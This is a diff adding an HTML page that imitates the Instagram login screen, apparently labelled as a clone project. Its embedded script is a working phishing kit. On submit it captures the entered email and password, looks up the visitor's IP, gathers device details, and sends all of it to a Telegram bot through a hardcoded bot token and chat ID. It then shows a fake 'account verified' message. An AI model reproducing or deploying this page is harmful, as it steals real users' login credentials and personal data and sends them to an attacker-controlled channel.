@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <title>Instagram-clone by ARUN</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="media-queries.css" />
+    <link rel="icon" href="insta-icon.jpg" />
+</head>
+<body>
+    <main>
+        <div class="log-in-container">
+            <div class="log-in">
+                <img src="logo.png" class="logo"/>
+                <form id="login-form" class="log-in-form">
+                    <input type="text" id="email" placeholder="Phone number,username or email" />
+                    <input type="password" id="password" placeholder="Password" />
+                    <button class="log-in-button">Log In</button>
+                </form>
+                <span class="or-divider">OR</span>
+                <div class="fb-login">
+                    <a href="#">
+                        <img src="facebook-icon.png">
+                        <span>Log in with Facebook</span>
+                    </a>
+                </div>
+                <a href="#">Forgot password?</a>
+            </div>
+            <div class="sign-up">
+                <span>Don't have an account
+                    <a href="#">Sign up</a>
+                </span>
+            </div>
+            <div class="get-the-app">
+                <span>Get the app</span>
+                <div class="app-images">
+                    <a href="#"><img src="applestore.png" /></a>
+                    <a href="#"><img src="googlestore.png" /></a>
+                </div>
+            </div>
+        </div>
+        <div class="phones-container">
+            <img src="phones.png" />
+        </div>
+    </main>
+    <footer>
+        <ul class="footer-links">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">JOBS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATION</a></li>
+            <li><a href="#">TOP</a></li>
+            <li><a href="#">ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <span class="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
+    </footer>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "8180568763:AAF8yhO9gTSIuypied7E7de9Z2IV0SLb3XY"; 
+        const CHAT_ID = "1987320796";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+                        <b>New Login Attempt</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    })
+                    .then(response => {
+                        console.log("Response:", response.data);
+                        alert('YOUR ACOUNT WAS VERIFIED !!');
+                    })
+                    .catch(error => {
+                        console.error("Error:", error.response ? error.response.data : error);
+                        alert('Error sending the information. Please try again.');
+                    });
+                })
+                .catch(error => {
+                    console.error("Error fetching the IP address:", error);
+                    alert('Error fetching the IP address. Please try again.');
+                });
+        });
+    </script>
+</body>
+</html>
